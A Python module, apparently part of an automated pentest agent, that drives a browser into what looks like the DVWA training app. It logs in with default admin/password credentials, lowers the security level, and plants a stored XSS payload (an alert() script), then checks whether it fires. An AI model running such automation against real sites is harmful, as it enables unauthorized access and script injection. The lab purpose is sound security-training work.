# agent/src/skills/xss_stored_low.py

from ..tools.browser import Browser
from pathlib import Path

def run(base_url: str, payload: str = '<script>alert("stored")</script>') -> dict:
    with Browser(base_url) as b:
        # 1) login
        b.goto("/login.php")
        b.page.wait_for_selector('input[name="username"]', timeout=15000)
        b.fill('input[name="username"]', "admin")
        b.fill('input[name="password"]', "password")
        b.click('input[type="submit"]')
        b.page.wait_for_load_state("domcontentloaded")

        # 2) best-effort: Security = Low (se a tela existir)
        try:
            b.goto("/security.php")
            b.page.wait_for_selector('select[name="security"]', timeout=5000)
            b.page.select_option('select[name="security"]', 'low')
            if b.page.locator('input[name="seclev_submit"]').count() > 0:
                b.click('input[name="seclev_submit"]')
            else:
                b.click('input[type="submit"]')
            b.page.wait_for_load_state("domcontentloaded")
        except Exception:
            pass

        # 3) ir para XSS Stored
        b.goto("/vulnerabilities/xss_s/")
        b.page.wait_for_selector('input[name="txtName"]', timeout=15000)

        # 4) preencher
        b.fill('input[name="txtName"]', "pwn")
        b.fill('textarea[name="mtxMessage"]', payload)

        # 5) hook para capturar o alert()
        alert_triggered = {"ok": False, "message": ""}
        def on_dialog(d):
            alert_triggered["ok"] = True
            alert_triggered["message"] = d.message
            d.accept()
        b.page.on("dialog", on_dialog)

        # 6) enviar
        if b.page.locator('input[name="btnSign"]').count() > 0:
            b.click('input[name="btnSign"]')
        else:
            b.click('input[type="submit"]')
        b.page.wait_for_load_state("domcontentloaded")

        # 7) aguardar potencial execução do alert
        b.page.wait_for_timeout(1200)

        # 8) salvar screenshot (pasta screens/ ao lado do projeto)
        #    base_dir = .../agent  -> queremos .../screens
        agent_dir = Path(__file__).resolve().parents[2]  # .../agent
        screens_dir = agent_dir.parent / "screens"
        screens_dir.mkdir(parents=True, exist_ok=True)
        screenshot_path = screens_dir / "xss_stored_low.png"
        b.page.screenshot(path=str(screenshot_path), full_page=True)

        # 9) avaliar sucesso: alert() capturado OU payload cru na página
        html = b.content()
        raw_present = "<script" in html and "alert(" in html
        escaped_present = "&lt;script" in html or "&lt;script&gt;" in html

        ok = alert_triggered["ok"] or raw_present
        reason = (
            f'alert() fired: "{alert_triggered["message"]}"' if alert_triggered["ok"]
            else ("raw <script> found in page" if raw_present
                  else ("payload appears escaped (provável nível > Low)" if escaped_present
                        else "payload not present"))
        )

        return {
            "ok": ok,
            "vector": "Stored XSS (Low)",
            "payload": payload,
            "reason": reason,
            "evidence_contains": (payload if raw_present else html[:1200]),
            "screenshot": str(screenshot_path)
        }
